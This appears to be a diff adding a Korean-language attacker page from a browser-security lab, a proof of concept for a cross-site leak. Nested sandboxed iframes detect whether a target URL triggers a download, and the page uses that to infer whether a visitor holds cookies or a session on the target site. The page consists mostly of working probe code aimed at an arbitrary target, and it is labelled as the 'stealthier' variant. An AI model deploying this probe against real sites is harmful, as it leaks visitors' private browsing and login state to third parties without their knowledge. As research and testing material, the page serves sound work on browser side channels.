@@ -1,0 +1,152 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Attacker Download Probe (Stealthier)</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      margin: 28px;
+      line-height: 1.5;
+      color: #111827;
+      background: #f8fafc;
+    }
+
+    main {
+      max-width: 960px;
+      margin: 0 auto;
+      background: #ffffff;
+      border: 1px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 8px 30px rgba(15, 23, 42, 0.06);
+    }
+
+    code {
+      background: #f1f5f9;
+      padding: 2px 6px;
+      border-radius: 6px;
+      font-size: 0.95em;
+    }
+
+    .panel {
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      padding: 12px;
+      background: #f8fafc;
+      margin: 12px 0;
+    }
+
+    button {
+      border: 1px solid #cbd5e1;
+      border-radius: 8px;
+      background: #ffffff;
+      padding: 8px 12px;
+      cursor: pointer;
+      margin-right: 8px;
+    }
+
+    button:hover {
+      background: #f1f5f9;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Attacker 페이지: Stealthier 이중 iframe 기반 다운로드 탐지</h1>
+
+    <p>타깃 URL: <code>__TARGET_BASE_TEXT__</code></p>
+    <p><a href="__ATTACKER_CLASSIC_URL__">기본 Performance API 버전으로 돌아가기</a></p>
+
+    <div class="panel">
+      <p>1) 바깥 iframe은 <code>sandbox</code>를 사용하며 <code>allow-downloads</code>를 주지 않아 실제 다운로드를 차단합니다.</p>
+      <p>2) 안쪽 iframe이 타깃 URL을 로드할 때, 다운로드가 발생하면 navigation이 일어나지 않아 same-origin 상태가 유지됩니다.</p>
+      <p>3) navigation이 일어나면 cross-origin이 되어 inner frame 접근 시 예외가 발생합니다.</p>
+    </div>
+
+    <p>
+      <button id="probe">탐지 실행</button>
+      <button id="clear">로그 지우기</button>
+    </p>
+
+    <pre id="log" class="panel" style="white-space: pre-wrap; min-height: 180px;"></pre>
+  </main>
+
+  <script>
+    const targetBase = __TARGET_BASE_JSON__;
+    const output = document.getElementById('log');
+
+    function log(line) {
+      output.textContent += '[' + new Date().toLocaleTimeString() + '] ' + line + '\n';
+      output.scrollTop = output.scrollHeight;
+    }
+
+    function buildProbeUrl() {
+      const nonce = String(Date.now()) + '-' + Math.random().toString(16).slice(2);
+      return targetBase + '?nonce=' + encodeURIComponent(nonce);
+    }
+
+    function escapeAttribute(value) {
+      return String(value).replaceAll('&', '&amp;').replaceAll('"', '&quot;');
+    }
+
+    async function runProbe() {
+      const target = buildProbeUrl();
+      log('probe target: ' + target);
+
+      const outer = document.createElement('iframe');
+      outer.style.display = 'none';
+      outer.sandbox = 'allow-scripts allow-same-origin allow-popups';
+      document.body.appendChild(outer);
+
+      const innerSrc = escapeAttribute(target);
+
+      const result = await new Promise((resolve) => {
+        let done = false;
+        const timeoutMs = 5000;
+        const timer = setTimeout(() => {
+          done = true;
+          resolve({ type: 'TIMEOUT' });
+        }, timeoutMs);
+
+        outer.onload = () => {
+          if (done) {
+            return;
+          }
+          done = true;
+          clearTimeout(timer);
+          try {
+            outer.contentWindow.frames[0].origin;
+            resolve({ type: 'DOWNLOAD_DETECTED' });
+          } catch (error) {
+            resolve({ type: 'NO_DOWNLOAD_DETECTED', error });
+          }
+        };
+
+        outer.srcdoc = `<iframe src="${innerSrc}"></iframe>`;
+      });
+
+      if (result.type === 'DOWNLOAD_DETECTED') {
+        log('result: navigation 미발생(same-origin 유지) -> 다운로드 시도 감지(방문 쿠키 없을 가능성)');
+      } else if (result.type === 'NO_DOWNLOAD_DETECTED') {
+        log('result: cross-origin navigation 발생 -> 다운로드 시도 미감지(방문 쿠키 있을 가능성)');
+      } else {
+        log('result: TIMEOUT -> 브라우저 정책/타이밍 영향으로 판별 실패');
+      }
+
+      outer.remove();
+    }
+
+    document.getElementById('probe').addEventListener('click', () => {
+      runProbe().catch((error) => {
+        log('error: ' + error.message);
+      });
+    });
+
+    document.getElementById('clear').addEventListener('click', () => {
+      output.textContent = '';
+    });
+  </script>
+</body>
+</html>
